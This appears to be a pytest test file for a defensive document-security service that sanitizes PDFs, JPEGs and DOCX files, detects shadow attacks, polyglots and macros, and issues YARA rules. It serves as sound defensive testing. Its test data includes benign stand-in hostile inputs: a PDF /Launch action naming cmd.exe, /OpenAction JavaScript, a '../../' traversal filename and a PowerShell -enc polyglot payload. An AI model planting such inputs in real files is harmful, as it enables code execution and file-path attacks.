import io
import sqlite3
import sys
from pathlib import Path

import pytest
from fastapi.testclient import TestClient
from pypdf import PdfReader, PdfWriter
from pypdf.generic import DictionaryObject, NameObject, TextStringObject

ROOT_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT_DIR))
sys.path.insert(0, str(ROOT_DIR / "demo_scripts"))

from app import main as app_main
from app.cdr_sanitizer import sanitize_image_bytes, sanitize_office_bytes, sanitize_pdf_bytes
from app.ledger import ChainOfCustodyLedger
from app.pdf_inspector import inspect_pdf_bytes
from app.sandbox_vaccine import SandboxVaccineEngine
from generate_clean_pdf import build_clean_signed_pdf
from generate_evil_pdf import build_infected_shadow_pdf
from generate_multiformat_demos import (
    build_clean_docx,
    build_clean_jpeg,
    build_macro_docx,
    build_polyglot_jpeg,
)


@pytest.fixture()
def isolated_client(tmp_path, monkeypatch):
    """Menyediakan TestClient FastAPI dengan database & direktori data terisolasi."""
    data_dir = tmp_path / "data"
    sanitized_dir = data_dir / "sanitized"
    sanitized_dir.mkdir(parents=True, exist_ok=True)

    test_ledger = ChainOfCustodyLedger(db_path=str(data_dir / "ledger.db"))
    test_sandbox = SandboxVaccineEngine(base_dir=str(data_dir))

    monkeypatch.setattr(app_main, "ledger", test_ledger)
    monkeypatch.setattr(app_main, "sandbox_engine", test_sandbox)
    monkeypatch.setattr(app_main, "SANITIZED_DIR", sanitized_dir)

    return TestClient(app_main.app, headers={"X-Kertopati-Token": app_main.API_TOKEN}), test_ledger, test_sandbox, sanitized_dir


def test_clean_pdf_passes_with_valid_byterange_and_cdr(isolated_client, tmp_path):
    """(a) PDF bersih lolos dengan ByteRange valid dan menghasilkan PDF sanitasi CDR."""
    client, _, _, sanitized_dir = isolated_client
    clean_pdf = tmp_path / "clean.pdf"
    build_clean_signed_pdf(clean_pdf)
    raw = clean_pdf.read_bytes()

    inspection = inspect_pdf_bytes(raw, "clean.pdf")
    assert inspection.verdict == "CLEAN"
    assert inspection.byterange_valid is True
    assert inspection.has_signature_field is True
    assert inspection.dangerous_tags_found == []

    resp = client.post(
        "/api/upload",
        files={"file": ("clean.pdf", raw, "application/pdf")},
        data={"source_unit": "Kodim 0606", "target_unit": "Korem 061 -> Pusat"},
    )
    assert resp.status_code == 200
    body = resp.json()
    assert body["soc_view"]["verdict"] == "CLEAN"
    assert body["soc_view"]["details"]["byterange_valid"] is True

    cdr_info = body["soc_view"]["cdr"]
    assert cdr_info["sanitized_filename"] == "sanitized_clean.pdf"
    assert (sanitized_dir / "sanitized_clean.pdf").exists()

    dl_resp = client.get(cdr_info["download_url"])
    assert dl_resp.status_code == 200
    assert dl_resp.headers["content-type"] == "application/pdf"
    assert dl_resp.content.startswith(b"%PDF")


def test_cdr_sanitizer_strips_risky_objects_and_metadata(tmp_path):
    """Memastikan CDR menghapus metadata asal serta objek /OpenAction, /AA, /JavaScript, /Launch."""
    writer = PdfWriter()
    page = writer.add_blank_page(width=400, height=400)
    page[NameObject("/AA")] = DictionaryObject({NameObject("/O"): TextStringObject("evil")})
    writer.add_metadata({"/Author": "Attacker", "/Title": "Secret"})
    writer._root_object[NameObject("/OpenAction")] = DictionaryObject(
        {NameObject("/S"): NameObject("/JavaScript"), NameObject("/JS"): TextStringObject("app.alert(1)")}
    )
    writer._root_object[NameObject("/Launch")] = DictionaryObject({NameObject("/F"): TextStringObject("cmd.exe")})

    buf = io.BytesIO()
    writer.write(buf)
    dirty_bytes = buf.getvalue()

    res = sanitize_pdf_bytes(dirty_bytes, "mild_risk.pdf", output_dir=tmp_path)
    assert "OriginalMetadata" in res.removed_elements
    assert any("/OpenAction" in item for item in res.removed_elements)
    assert any("/AA" in item for item in res.removed_elements)
    assert any("/Launch" in item for item in res.removed_elements)

    # Pastikan hasil rekonstruksi bersih dari tag berbahaya
    sanitized_inspection = inspect_pdf_bytes(res.sanitized_bytes, res.sanitized_filename)
    assert sanitized_inspection.dangerous_tags_found == []
    reader = PdfReader(io.BytesIO(res.sanitized_bytes))
    assert reader.metadata["/Producer"] == "SandiSeal CDR Sanitizer (Zero-Trust)"
    assert "/Author" not in reader.metadata


def test_shadow_attack_detected_and_triggers_yara_vaccine(isolated_client, tmp_path):
    """(b) PDF Shadow Attack + /OpenAction terdeteksi dan memicu aturan YARA baru."""
    client, _, test_sandbox, _ = isolated_client
    evil_pdf = tmp_path / "evil.pdf"
    build_infected_shadow_pdf(evil_pdf)
    raw = evil_pdf.read_bytes()

    resp = client.post(
        "/api/upload",
        files={"file": ("evil.pdf", raw, "application/pdf")},
    )
    assert resp.status_code == 200
    body = resp.json()

    # Pengirim tetap mendapat respons plasebo 200 OK
    assert body["sender_view"]["status"] == "200 OK"
    # SOC melihat deteksi Shadow Attack + /OpenAction
    soc = body["soc_view"]
    assert soc["verdict"] == "INFECTED_SANDBOXED"
    assert soc["details"]["byterange_valid"] is False
    assert "/OpenAction" in soc["details"]["dangerous_tags_found"]

    # Vaksin YARA baru harus diterbitkan
    vaccines = test_sandbox.get_active_vaccines()
    assert len(vaccines) >= 1
    assert soc["sandbox_event"]["generated_vaccine"] == vaccines[0]["rule_name"]


def test_reupload_similar_pattern_blocked_by_yara_vaccine(isolated_client, tmp_path):
    """(c) Upload ulang PDF dengan pola serupa otomatis terblokir oleh Vaksin YARA yang baru terbit."""
    client, _, test_sandbox, _ = isolated_client

    # Langkah 1: Detonasi sampel terinfeksi pertama agar vaksin terbit
    evil_pdf = tmp_path / "evil_first.pdf"
    build_infected_shadow_pdf(evil_pdf)
    client.post(
        "/api/upload",
        files={"file": ("evil_first.pdf", evil_pdf.read_bytes(), "application/pdf")},
    )
    vaccines = test_sandbox.get_active_vaccines()
    assert len(vaccines) == 1
    ioc_pattern = vaccines[0]["pattern"]

    # Langkah 2: Buat PDF baru yang tidak punya tag /OpenAction atau Shadow Update,
    # tetapi membawa pola IOC yang sama di dalam kontennya
    writer = PdfWriter()
    writer.add_blank_page(width=595, height=842)
    buf = io.BytesIO()
    writer.write(buf)
    variant_bytes = buf.getvalue().rstrip(b"%%EOF\r\n") + f"\n% payload: {ioc_pattern}\n%%EOF\n".encode("utf-8")

    resp2 = client.post(
        "/api/upload",
        files={"file": ("variant.pdf", variant_bytes, "application/pdf")},
    )
    assert resp2.status_code == 200
    soc2 = resp2.json()["soc_view"]
    assert soc2["verdict"] == "INFECTED_SANDBOXED"
    assert vaccines[0]["rule_name"] in soc2["details"]["matched_vaccines"]


def test_ledger_verify_chain_valid_and_detects_tampering(isolated_client, tmp_path):
    """(d) verify_chain() mengembalikan status valid dan mendeteksi manipulasi manual."""
    client, test_ledger, _, _ = isolated_client
    clean_pdf = tmp_path / "clean.pdf"
    build_clean_signed_pdf(clean_pdf)

    # Tambahkan 2 blok
    test_ledger.append_block("doc1.pdf", clean_pdf.read_bytes(), "Kodim 0606", "Pusat", "BSrE ByteRange Utuh", "CLEAN")
    test_ledger.append_block("doc2.pdf", b"sample-2", "Kodim 0606", "Pusat", "BSrE ByteRange Utuh", "CLEAN")

    verify_res = test_ledger.verify_chain()
    assert verify_res["valid"] is True
    assert verify_res["status"] == "VERIFIED"
    assert verify_res["total_blocks"] == 2
    assert verify_res["tampered_blocks"] == []

    api_verify = client.get("/api/ledger/verify")
    assert api_verify.status_code == 200
    assert api_verify.json()["status"] == "VERIFIED"

    # Simulasi manipulasi manual baris database
    with sqlite3.connect(test_ledger.db_path) as conn:
        conn.execute("UPDATE custody_blocks SET filename = 'doc1_palsu.pdf' WHERE block_index = 1")
        conn.commit()

    tampered_res = test_ledger.verify_chain()
    assert tampered_res["valid"] is False
    assert tampered_res["status"] == "TAMPERED"
    assert len(tampered_res["tampered_blocks"]) >= 1
    assert tampered_res["tampered_blocks"][0]["block_index"] == 1

    # Reset demo data harus membersihkan ledger dan vaksin
    reset_resp = client.post("/api/demo/reset")
    assert reset_resp.status_code == 200
    after_reset = test_ledger.verify_chain()
    assert after_reset["valid"] is True
    assert after_reset["total_blocks"] == 0


def test_signature_structure_ocg_cve_2025_59802_and_diff_preview(tmp_path):
    """5(a) Deteksi /OCG /OCProperties, /SubFilter /adbe.pkcs7.detached, dan post_signature_diff_preview."""
    clean_pdf = tmp_path / "base.pdf"
    build_clean_signed_pdf(clean_pdf)
    base_bytes = clean_pdf.read_bytes()

    # Simulasikan PDF dengan kamus tanda tangan nyata + OCG + trailing update
    sig_dict = (
        b"\n% /Type /Sig /SubFilter /adbe.pkcs7.detached /Contents <30820100>\n"
        b"50 0 obj << /OCProperties << /OCGs [51 0 R] >> /OCG true >> endobj\n"
    )
    # Buat ByteRange yang berhenti sebelum sig_dict
    br_bytes = (
        b"%PDF-1.4\n1 0 obj << /Type /Sig /SubFilter /adbe.pkcs7.detached /Contents <ABCD> "
        b"/ByteRange [0 10 20 80] >> endobj\n%%EOF\n"
    )
    evil_bytes = br_bytes + sig_dict

    res = inspect_pdf_bytes(evil_bytes, "ocg_spoof.pdf")
    assert res.verdict == "INFECTED"
    assert res.signature_details["has_type_sig"] is True
    assert res.signature_details["subfilter"] == "/adbe.pkcs7.detached"
    assert res.signature_details["has_contents"] is True
    assert res.ocg_detected is True
    assert "/OCProperties" in res.ocg_tags_found
    assert "/OCG" in res.ocg_tags_found
    assert res.byterange_valid is False
    assert "/OCProperties" in res.post_signature_diff_preview


def test_multihop_and_tamper_simulation(isolated_client):
    """5(b) Alur 3-Hop Kodim -> Korem -> Pusat dan skenario Tamper."""
    client, test_ledger, _, _ = isolated_client

    mh_resp = client.post("/api/demo/multihop")
    assert mh_resp.status_code == 200
    mh_data = mh_resp.json()
    assert mh_data["soc_view"]["verdict"] == "CLEAN"
    assert len(mh_data["soc_view"]["multihop_blocks"]) == 3
    assert mh_data["soc_view"]["ledger_verification"]["status"] == "VERIFIED"
    assert len(test_ledger.list_blocks()) == 3

    tamper_resp = client.post("/api/demo/tamper")
    assert tamper_resp.status_code == 200
    tamper_data = tamper_resp.json()
    assert tamper_data["soc_view"]["verdict"] == "TAMPERED"
    assert tamper_data["soc_view"]["verification"]["valid"] is False
    assert tamper_data["soc_view"]["verification"]["status"] == "TAMPERED"
    assert tamper_data["soc_view"]["tampered_block_index"] == 2


def test_vaccine_toggle_export_and_import(isolated_client, tmp_path):
    """5(c) Toggle vaksin (nonaktif tidak memblokir, aktif memblokir) serta export & import bundle."""
    client, _, test_sandbox, _ = isolated_client

    # Trigger vaksin baru dari PDF terinfeksi
    evil_pdf = tmp_path / "evil.pdf"
    build_infected_shadow_pdf(evil_pdf)
    client.post("/api/upload", files={"file": ("evil.pdf", evil_pdf.read_bytes(), "application/pdf")})

    vaccines = test_sandbox.get_active_vaccines()
    assert len(vaccines) == 1
    rule_name = vaccines[0]["rule_name"]
    ioc_pattern = vaccines[0]["pattern"]

    # Buat PDF varian dengan IOC yang sama
    writer = PdfWriter()
    writer.add_blank_page(width=400, height=400)
    buf = io.BytesIO()
    writer.write(buf)
    variant_bytes = buf.getvalue().rstrip(b"%%EOF\r\n") + f"\n% {ioc_pattern}\n%%EOF\n".encode("utf-8")

    # Nonaktifkan vaksin -> varian harus lolos (CLEAN)
    tog1 = client.patch(f"/api/vaccines/{rule_name}/toggle")
    assert tog1.status_code == 200
    assert tog1.json()["vaccine"]["enabled"] is False

    res_disabled = client.post("/api/upload", files={"file": ("v1.pdf", variant_bytes, "application/pdf")})
    assert res_disabled.json()["soc_view"]["verdict"] == "CLEAN"

    # Aktifkan kembali -> varian harus diblokir
    tog2 = client.patch(f"/api/vaccines/{rule_name}/toggle")
    assert tog2.status_code == 200
    assert tog2.json()["vaccine"]["enabled"] is True

    res_enabled = client.post("/api/upload", files={"file": ("v2.pdf", variant_bytes, "application/pdf")})
    assert res_enabled.json()["soc_view"]["verdict"] == "INFECTED_SANDBOXED"
    assert rule_name in res_enabled.json()["soc_view"]["details"]["matched_vaccines"]

    # Export bundle
    exp_resp = client.get("/api/vaccines/export")
    assert exp_resp.status_code == 200
    bundle = exp_resp.json()
    assert bundle["count"] == 1

    # Reset lalu import kembali bundle
    client.post("/api/demo/reset")
    assert len(test_sandbox.get_active_vaccines()) == 0

    imp_resp = client.post("/api/vaccines/import", json=bundle)
    assert imp_resp.status_code == 200
    assert imp_resp.json()["imported_count"] == 1
    assert len(test_sandbox.get_active_vaccines()) == 1


def test_upload_security_hardening_magic_bytes_and_size_limit(isolated_client):
    """5(d) Penolakan upload non-PDF (magic bytes salah) & batas ukuran >10 MB."""
    client, _, test_sandbox, _ = isolated_client

    # 1. File menyamar sebagai .pdf tetapi magic bytes bukan %PDF-
    fake_pdf = b"MZ\x90\x00THIS_IS_AN_EXECUTABLE_POLYGLOT"
    resp_fake = client.post(
        "/api/upload",
        files={"file": ("../../evil_script.pdf", fake_pdf, "application/pdf")},
    )
    assert resp_fake.status_code == 200
    body_fake = resp_fake.json()
    assert body_fake["sender_view"]["status"] == "200 OK"  # Plasebo
    assert body_fake["soc_view"]["verdict"] == "INFECTED_SANDBOXED"
    assert body_fake["soc_view"]["details"]["magic_bytes_valid"] is False
    assert "evil_script.pdf" in body_fake["soc_view"]["details"]["filename"]
    assert len(test_sandbox.get_sandbox_events()) == 1

    # 2. File melebihi batas 10 MB -> HTTP 413
    oversized = b"%PDF-1.4\n" + (b"A" * (10 * 1024 * 1024 + 10))
    resp_big = client.post(
        "/api/upload",
        files={"file": ("huge.pdf", oversized, "application/pdf")},
    )
    assert resp_big.status_code == 413


def test_jpeg_clean_cdr_and_polyglot_detection(isolated_client, tmp_path):
    """JPEG bersih lolos & CDR membuang EXIF; JPEG polyglot terdeteksi INFECTED & terbit vaksin YARA."""
    from PIL import Image

    client, _, test_sandbox, sanitized_dir = isolated_client

    clean_jpg = tmp_path / "clean.jpg"
    build_clean_jpeg(clean_jpg, with_exif=True)
    clean_bytes = clean_jpg.read_bytes()

    resp_clean = client.post(
        "/api/upload",
        files={"file": ("clean.jpg", clean_bytes, "image/jpeg")},
    )
    assert resp_clean.status_code == 200
    body_clean = resp_clean.json()
    assert body_clean["soc_view"]["verdict"] == "CLEAN"
    assert body_clean["soc_view"]["details"]["file_format"] == "JPEG"

    # Pastikan hasil CDR tidak memiliki EXIF
    sanitized_path = sanitized_dir / body_clean["soc_view"]["cdr"]["sanitized_filename"]
    assert sanitized_path.exists()
    with Image.open(sanitized_path) as simg:
        assert len(simg.getexif()) == 0

    # JPEG polyglot dengan trailing bytes setelah FF D9
    poly_jpg = tmp_path / "polyglot.jpg"
    build_polyglot_jpeg(poly_jpg)
    resp_poly = client.post(
        "/api/upload",
        files={"file": ("polyglot.jpg", poly_jpg.read_bytes(), "image/jpeg")},
    )
    assert resp_poly.status_code == 200
    body_poly = resp_poly.json()
    assert body_poly["sender_view"]["status"] == "200 OK"  # Plasebo
    assert body_poly["soc_view"]["verdict"] == "INFECTED_SANDBOXED"
    assert "TRAILING_POLYGLOT" in body_poly["soc_view"]["details"]["dangerous_tags_found"]
    vaccines = test_sandbox.get_active_vaccines()
    assert len(vaccines) >= 1
    assert "uint16(0) == 0xD8FF" in vaccines[0]["yara_preview"]


def test_docx_clean_macro_detection_and_office_cdr(isolated_client, tmp_path):
    """DOCX bersih lolos; DOCX dengan vbaProject.bin & External rels masuk sandbox; CDR Office steril."""
    import zipfile

    client, _, test_sandbox, _ = isolated_client

    clean_docx = tmp_path / "clean.docx"
    build_clean_docx(clean_docx)
    resp_clean = client.post(
        "/api/upload",
        files={
            "file": (
                "clean.docx",
                clean_docx.read_bytes(),
                "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            )
        },
    )
    assert resp_clean.status_code == 200
    assert resp_clean.json()["soc_view"]["verdict"] == "CLEAN"
    assert resp_clean.json()["soc_view"]["details"]["file_format"] == "DOCX"

    macro_docx = tmp_path / "macro.docx"
    build_macro_docx(macro_docx)
    macro_bytes = macro_docx.read_bytes()
    resp_macro = client.post(
        "/api/upload",
        files={
            "file": (
                "macro.docx",
                macro_bytes,
                "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            )
        },
    )
    assert resp_macro.status_code == 200
    soc_macro = resp_macro.json()["soc_view"]
    assert soc_macro["verdict"] == "INFECTED_SANDBOXED"
    assert "VBA_MACRO" in soc_macro["details"]["dangerous_tags_found"]
    assert "EXTERNAL_RELS" in soc_macro["details"]["dangerous_tags_found"]
    assert len(test_sandbox.get_sandbox_events()) == 1

    # Verifikasi CDR Office membuang vbaProject.bin & TargetMode="External"
    cdr_res = sanitize_office_bytes(macro_bytes, "macro.docx", output_dir=tmp_path)
    assert any("vbaproject.bin" in el.lower() for el in cdr_res.removed_elements)
    with zipfile.ZipFile(io.BytesIO(cdr_res.sanitized_bytes), "r") as zf:
        names = [n.lower() for n in zf.namelist()]
        assert not any(n.endswith("vbaproject.bin") for n in names)
        if "word/_rels/document.xml.rels" in names:
            rels = zf.read("word/_rels/document.xml.rels")
            assert b'TargetMode="External"' not in rels


def test_cdr_size_comparison_and_hitl_sandbox_review(isolated_client, tmp_path):
    """Menguji bukti ukuran CDR Before/After serta kedua keputusan HITL di Auto-Sandbox."""
    client, test_ledger, test_sandbox, _ = isolated_client

    # 1. Bukti CDR Before vs After pada dokumen bersih
    clean_pdf = tmp_path / "clean_hitl.pdf"
    build_clean_signed_pdf(clean_pdf)
    raw_clean = clean_pdf.read_bytes()
    resp_clean = client.post(
        "/api/upload",
        files={"file": ("clean_hitl.pdf", raw_clean, "application/pdf")},
    )
    assert resp_clean.status_code == 200
    cdr_info = resp_clean.json()["soc_view"]["cdr"]
    assert cdr_info["original_size_bytes"] == len(raw_clean)
    assert cdr_info["sanitized_size_bytes"] > 0
    assert "stripped_elements" in cdr_info

    # 2. Masukkan 2 sampel ke Auto-Sandbox (Evil PDF & Polyglot JPEG)
    evil_pdf = tmp_path / "evil_hitl.pdf"
    build_infected_shadow_pdf(evil_pdf)
    r1 = client.post(
        "/api/upload",
        files={"file": ("evil_hitl.pdf", evil_pdf.read_bytes(), "application/pdf")},
    )
    ev1 = r1.json()["soc_view"]["sandbox_event"]
    assert ev1["hitl_status"] == "PENDING_REVIEW"
    prefix1 = ev1["sha256_prefix"]

    poly_jpg = tmp_path / "poly_hitl.jpg"
    build_polyglot_jpeg(poly_jpg)
    r2 = client.post(
        "/api/upload",
        files={"file": ("poly_hitl.jpg", poly_jpg.read_bytes(), "image/jpeg")},
    )
    ev2 = r2.json()["soc_view"]["sandbox_event"]
    prefix2 = ev2["sha256_prefix"]

    # 3. Keputusan A: CONFIRMED_COMPROMISED
    rev1 = client.post(
        f"/api/sandbox/{prefix1}/review",
        json={"decision": "CONFIRMED_COMPROMISED"},
    )
    assert rev1.status_code == 200
    assert rev1.json()["event"]["hitl_status"] == "PERANGKAT_TERINFEKSI"
    assert rev1.json()["ledger_block"]["bsre_status"] == "HITL: PERANGKAT TERINFEKSI"
    assert len(test_sandbox.get_enabled_vaccines()) >= 1

    # 4. Keputusan B: HUMAN_ERROR_RELEASE_CDR
    rev2 = client.post(
        f"/api/sandbox/{prefix2}/review",
        json={"decision": "HUMAN_ERROR_RELEASE_CDR"},
    )
    assert rev2.status_code == 200
    rev2_body = rev2.json()
    assert rev2_body["event"]["hitl_status"] == "KELALAIAN_PENGGUNA"
    dl_url = rev2_body["cdr"]["download_url"]
    assert rev2_body["cdr"]["original_size_bytes"] > rev2_body["cdr"]["sanitized_size_bytes"]
    dl_res = client.get(dl_url)
    assert dl_res.status_code == 200
    assert dl_res.content.startswith(b"\xff\xd8\xff")
    assert test_ledger.verify_chain()["valid"] is True


def test_ai_threat_analyst_polyglot_base64_mitre_sigma_and_able_gate(isolated_client, tmp_path):
    """Menguji pipeline 3-tahap AI Threat Analyst pada laporan_lapangan_polyglot.jpg."""
    client, _, test_sandbox, _ = isolated_client

    poly_jpg = tmp_path / "laporan_lapangan_polyglot.jpg"
    build_polyglot_jpeg(poly_jpg)

    resp = client.post(
        "/api/upload",
        files={"file": ("laporan_lapangan_polyglot.jpg", poly_jpg.read_bytes(), "image/jpeg")},
    )
    assert resp.status_code == 200
    soc = resp.json()["soc_view"]
    assert soc["verdict"] == "INFECTED_SANDBOXED"

    vaccines = test_sandbox.get_active_vaccines()
    assert len(vaccines) == 1
    vac = vaccines[0]
    ai = vac["ai_analysis"]

    # (a) Base64 powershell -enc berhasil di-decode (UTF-16LE -> '$client = test')
    assert "$client = test" in ai["decoded_payload"]

    # (b) Minimal 1 teknik MITRE ATT&CK terpetakan
    assert len(ai["mitre_attack"]) >= 1
    assert any("T1059.001" in m for m in ai["mitre_attack"])

    # (c) Sigma YAML rule dan YARA rule terbentuk
    assert "detection:" in ai["sigma_network_rule"]
    assert "condition:" in ai["sigma_network_rule"]
    assert "$decoded_cmd" in vac["yara_preview"]
    assert "uint16(0) == 0xD8FF" in vac["yara_preview"]

    # (d) ABLE Self-Validation Gate berstatus VALIDATED dengan false_positive_test == PASS
    assert ai["validation_status"].startswith("VALIDATED")
    assert ai["recall_test"] == "PASS"
    assert ai["false_positive_test"] == "PASS"
    assert ai["commander_brief"]

    # Pastikan export bundle menyertakan ai_analysis
    bundle = client.get("/api/vaccines/export").json()
    assert bundle["vaccines"][0]["ai_analysis"]["validation_status"].startswith("VALIDATED")


def test_cyber_range_simulate_without_and_with_kertopati(isolated_client):
    """
    Uji endpoint POST /api/simulate:
    - Mode WITHOUT_KERTOPATI -> server COMPROMISED / TAKEN OVER.
    - Mode WITH_KERTOPATI -> Honeypot Plasebo + Forensik + Vaksin YARA + 4 satuan IMMUNIZED.
    """
    client, _ledger, test_sandbox, _ = isolated_client

    vuln_resp = client.post(
        "/api/simulate",
        json={"cve_id": "CVE-2026-91814", "protection_mode": "WITHOUT_KERTOPATI"},
    )
    assert vuln_resp.status_code == 200
    vuln_data = vuln_resp.json()
    assert vuln_data["server_status"] == "COMPROMISED / TAKEN OVER"
    assert vuln_data["attacker_view"]["status"] == "SHELL_OPENED"
    assert vuln_data["soc_view"]["immunized_units"]["Kodim 0606"] == "COMPROMISED"

    prot_resp = client.post(
        "/api/simulate",
        json={"cve_id": "JPEG-POLYGLOT", "protection_mode": "WITH_KERTOPATI"},
    )
    assert prot_resp.status_code == 200
    prot_data = prot_resp.json()
    assert prot_data["server_status"] == "SANDBOXED_IMMUNIZED"
    assert "PLASEBO" in prot_data["attacker_view"]["status"]
    soc = prot_data["soc_view"]
    assert soc["verdict"] == "INFECTED_SANDBOXED"
    assert soc["forensic_telemetry"]["payload_sha256"]
    assert len(soc["forensic_telemetry"]["honeypot_commands"]) >= 1
    assert all(status == "IMMUNIZED" for status in soc["immunized_units"].values())
    assert len(test_sandbox.get_active_vaccines()) == 1


def test_xray_forensic_inspector_pdf_jpeg_docx(isolated_client, tmp_path):
    """
    Uji endpoint GET /api/xray/{sha256_prefix} memisahkan byte sah vs sisipan berbahaya
    untuk PDF, JPEG Polyglot, dan DOCX Macro.
    """
    client, _ledger, _sandbox, _ = isolated_client

    # 1. PDF Shadow / Active Content
    evil_pdf = tmp_path / "evil_xray.pdf"
    build_infected_shadow_pdf(evil_pdf)
    r_pdf = client.post("/api/upload", files={"file": ("evil_xray.pdf", evil_pdf.read_bytes(), "application/pdf")})
    sha_pdf = r_pdf.json()["soc_view"]["sandbox_event"]["sha256_prefix"]
    xray_pdf = client.get(f"/api/xray/{sha_pdf}").json()
    assert xray_pdf["xray_type"] == "PDF_REGIONS"
    assert xray_pdf["injected_region"]["size_bytes"] > 0

    # 2. JPEG Polyglot
    poly_jpg = tmp_path / "poly_xray.jpg"
    build_polyglot_jpeg(poly_jpg)
    r_jpg = client.post("/api/upload", files={"file": ("poly_xray.jpg", poly_jpg.read_bytes(), "image/jpeg")})
    sha_jpg = r_jpg.json()["soc_view"]["sandbox_event"]["sha256_prefix"]
    xray_jpg = client.get(f"/api/xray/{sha_jpg}").json()
    assert xray_jpg["xray_type"] == "IMAGE_POLYGLOT"
    assert xray_jpg["valid_image_bytes"]["size_bytes"] > 0
    assert xray_jpg["trailing_payload_hex_ascii"]["size_bytes"] > 0
    assert "powershell" in xray_jpg["trailing_payload_hex_ascii"]["preview_ascii"].lower()

    # 3. DOCX Macro + External Rels
    macro_docx = tmp_path / "macro_xray.docx"
    build_macro_docx(macro_docx)
    r_docx = client.post(
        "/api/upload",
        files={
            "file": (
                "macro_xray.docx",
                macro_docx.read_bytes(),
                "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            )
        },
    )
    sha_docx = r_docx.json()["soc_view"]["sandbox_event"]["sha256_prefix"]
    xray_docx = client.get(f"/api/xray/{sha_docx}").json()
    assert xray_docx["xray_type"] == "OOXML_ARCHIVE"
    flagged = [e["filename"] for e in xray_docx["zip_entries"] if e["suspicious"]]
    assert any("vbaproject.bin" in f.lower() for f in flagged)
    assert any(".rels" in f.lower() for f in flagged)


def test_watchdog_agent_once_and_webhook_alert(isolated_client, tmp_path):
    """
    Uji agent/kertopati_agent.py mode --once terhadap server lokal sementara:
    - File bersih dipindahkan ke clean_outbox/
    - File terinfeksi dipindahkan ke quarantine_local/
    - Heartbeat agent tercatat di GET /api/agent/status sebagai ACTIVE
    - Webhook event alert tercatat di GET /api/webhooks/events
    """
    import socket
    import subprocess
    import threading
    import time
    import uvicorn

    client, _ledger, _sandbox, _ = isolated_client

    # Daftarkan webhook uji (endpoint lokal offline tidak boleh memblokir pipeline)
    wh_res = client.post(
        "/api/webhooks/register",
        json={"name": "SIEM Command Uji", "url": "http://127.0.0.1:9/siem-hook"},
    )
    assert wh_res.status_code == 200
    assert wh_res.json()["total_webhooks"] == 1
    assert wh_res.json()["webhook"]["url"] == "http://127.0.0.1:9/siem-hook"

    watch_dir = tmp_path / "watch_inbox"
    clean_dir = tmp_path / "clean_outbox"
    quarantine_dir = tmp_path / "quarantine_local"
    watch_dir.mkdir()

    build_clean_signed_pdf(watch_dir / "clean_watchdog.pdf")
    build_polyglot_jpeg(watch_dir / "evil_watchdog.jpg")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        port = sock.getsockname()[1]

    config = uvicorn.Config(app_main.app, host="127.0.0.1", port=port, log_level="error")
    server = uvicorn.Server(config)
    thread = threading.Thread(target=server.run, daemon=True)
    thread.start()

    try:
        deadline = time.time() + 5.0
        while not server.started and time.time() < deadline:
            time.sleep(0.05)

        proc = subprocess.run(
            [
                sys.executable,
                str(ROOT_DIR / "agent" / "kertopati_agent.py"),
                "--server-url",
                f"http://127.0.0.1:{port}",
                "--watch-dir",
                str(watch_dir),
                "--clean-dir",
                str(clean_dir),
                "--quarantine-dir",
                str(quarantine_dir),
                "--once",
            ],
            capture_output=True,
            text=True,
            check=True,
        )
        assert '"files_audited": 2' in proc.stdout
    finally:
        server.should_exit = True
        thread.join(timeout=3.0)

    assert (clean_dir / "clean_watchdog.pdf").exists()
    assert (quarantine_dir / "evil_watchdog.jpg").exists()
    assert not (watch_dir / "clean_watchdog.pdf").exists()
    assert not (watch_dir / "evil_watchdog.jpg").exists()

    agent_st = client.get("/api/agent/status").json()
    assert agent_st["status"] == "ACTIVE"
    assert agent_st["agent_name"] == "Kertopati AI Agent"
    assert agent_st["total_files_audited"] == 2
    assert agent_st["vaccines_generated"] >= 1
    assert len(agent_st["last_mitre_techniques"]) >= 1

    wh_events = client.get("/api/webhooks/events").json()["events"]
    assert any(ev["payload"].get("filename") == "evil_watchdog.jpg" for ev in wh_events)


def test_real_isolated_sandbox_execution_and_timeout_isolation(isolated_client, tmp_path, monkeypatch):
    """
    Uji app/real_sandbox.py execute_in_isolated_sandbox():
    - Mengembalikan execution_backend, container_id, isolation_flags, exit_code, dan stdout nyata dari /decoy_satuan.
    - Tidak menulis file apa pun ke direktori proyek host.
    - Menangani timeout eksekusi secara aman (exit_code == 124).
    - Terintegrasi ke endpoint POST /api/simulate (WITH_KERTOPATI).
    """
    import subprocess
    from app import real_sandbox

    client, _ledger, _sandbox, _ = isolated_client

    poly_jpg = tmp_path / "sandbox_test_poly.jpg"
    build_polyglot_jpeg(poly_jpg)
    raw_bytes = poly_jpg.read_bytes()

    marker_file = ROOT_DIR / "should_never_be_created_by_sandbox.txt"
    assert not marker_file.exists()

    sbx = real_sandbox.execute_in_isolated_sandbox(
        raw_bytes=raw_bytes,
        filename="sandbox_test_poly.jpg",
        cve_id="JPEG-POLYGLOT",
        timeout_seconds=5,
    )
    assert sbx["execution_backend"]
    assert sbx["container_id"]
    assert len(sbx["isolation_flags"]) >= 3
    assert sbx["exit_code"] == 0
    assert sbx["decoy_dir_verified"] is True
    assert "DOKUMEN UMPAN PLASEBO SATUAN (DECOY_SATUAN)" in sbx["stdout"]
    assert "$client = test" in sbx["stdout"]
    assert not marker_file.exists()

    # Pastikan simulasi timeout ditangani aman tanpa crash
    monkeypatch.setattr(real_sandbox, "_check_docker_available", lambda: None)

    def _fake_timeout(*args, **kwargs):
        raise subprocess.TimeoutExpired(cmd=kwargs.get("args", ["sh"]), timeout=kwargs.get("timeout", 3))

    monkeypatch.setattr(real_sandbox.subprocess, "run", _fake_timeout)
    sbx_timeout = real_sandbox.execute_in_isolated_sandbox(
        raw_bytes=raw_bytes,
        filename="timeout_probe.jpg",
        cve_id="JPEG-POLYGLOT",
        timeout_seconds=1,
    )
    assert sbx_timeout["exit_code"] == 124
    assert "TIMEOUT" in sbx_timeout["stdout"]
    assert "Restricted Local Ephemeral Sandbox" in sbx_timeout["execution_backend"]

    # Kembalikan fungsi asli sebelum menguji endpoint /api/simulate
    monkeypatch.undo()
    sim_resp = client.post(
        "/api/simulate",
        json={"cve_id": "JPEG-POLYGLOT", "protection_mode": "WITH_KERTOPATI"},
    )
    assert sim_resp.status_code == 200
    sim_data = sim_resp.json()
    assert "sandbox_execution" in sim_data
